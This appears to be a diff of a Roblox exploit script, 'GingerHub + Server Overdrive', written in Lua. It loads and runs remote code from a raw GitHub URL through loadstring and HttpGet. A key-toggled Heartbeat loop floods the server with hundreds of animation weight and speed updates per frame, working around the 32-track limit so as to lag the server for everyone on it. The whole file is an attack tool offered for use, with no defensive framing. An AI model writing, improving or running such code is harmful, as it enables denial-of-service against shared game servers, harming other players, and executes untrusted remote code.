@@ -1,56 +1,77 @@
--- // GINGERHUB LOADER + SERVER CONFUSION \\ --
-local GINGERHUB_LINK = "https://raw.githubusercontent.com/panoww07/gingerhub/refs/heads/main/apstein.lua"
+-- // GINGERHUB + SERVER OVERDRIVE [JAN 2026] \\ --
 
--- 1. THE HUB LOADER
+local GINGERHUB_LINK = "https://raw.githubusercontent.com/panoww07/gingerhub/refs/heads/main/apstein.lua"
+local player = game.Players.LocalPlayer
+local active = false
+local confusionId = "rbxassetid://15264639453" -- High-Complexity UGC ID
+
+-- 1. THE HUB LOADER (Attempts to load your GitHub file)
 task.spawn(function()
     local success, err = pcall(function()
         loadstring(game:HttpGet(GINGERHUB_LINK))()
     end)
     if not success then
-        warn("GingerHub failed to load: " .. tostring(err))
+        warn("GingerHub Loader: Link still 404 or Private. Lag script is still ready.")
     end
 end)
 
--- 2. THE SERVER CONFUSION BYPASS (JAN 2026)
-local player = game.Players.LocalPlayer
-local active = false
-local confusionId = "rbxassetid://15264639453" 
+-- 2. NOTIFICATION SYSTEM
+local function notify(state)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "GingerHub",
+        Text = state and "OVERDRIVE: ACTIVE (Lagging Server)" or "OVERDRIVE: DISABLED",
+        Duration = 3,
+        Button1 = "OK"
+    })
+end
 
+-- 3. TOGGLE KEY (K)
 game:GetService("UserInputService").InputBegan:Connect(function(i, g)
     if not g and i.KeyCode == Enum.KeyCode.K then
         active = not active
-        print("Confusion Mode:", active)
+        notify(active)
     end
 end)
 
+-- 4. THE SERVER STRESSER LOOP
+-- Uses the 'Weight-Spam' bypass to avoid the 32-track limit
 game:GetService("RunService").Heartbeat:Connect(function()
     if active then
         local char = player.Character
-        local animator = char and char:FindFirstChildOfClass("Humanoid") and char.Humanoid:FindFirstChildOfClass("Animator")
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        local animator = hum and hum:FindFirstChildOfClass("Animator")
         
         if animator then
-            -- Force-clean to stay under the 32-track limit
+            -- BYPASS: Clean tracks to stay at 0/32 tracks used
             for _, t in pairs(animator:GetPlayingAnimationTracks()) do
                 t:Destroy()
             end
 
-            -- Payload
+            -- PAYLOAD: Load and flood with property updates
             local a = Instance.new("Animation")
             a.AnimationId = confusionId
-            local t = animator:LoadAnimation(a)
-            t:Play()
-
-            -- Weight Spam (600 packets per frame)
-            for i = 1, 600 do
-                t:AdjustWeight(math.random(1, 100) / 10)
-                t:AdjustSpeed(math.random(1, 100) / 10)
-            end
             
-            task.spawn(function()
-                task.wait()
-                t:Destroy()
-                a:Destroy()
-            end)
+            local success, t = pcall(function() return animator:LoadAnimation(a) end)
+            
+            if success and t then
+                t:Play()
+
+                -- HEAVY PACKET SPAM
+                -- We use 400 iterations with complex math to force server-side recalculation
+                for i = 1, 400 do
+                    t:AdjustWeight(math.random(1, 1000000) / 100)
+                    t:AdjustSpeed(math.random(1, 1000000) / 100)
+                end
+                
+                -- Fast cleanup to keep your connection from timing out
+                task.spawn(function()
+                    task.wait()
+                    t:Destroy()
+                    a:Destroy()
+                end)
+            end
         end
     end
 end)
+
+print("GingerHub & Overdrive Loaded. Press 'K' to Toggle.")
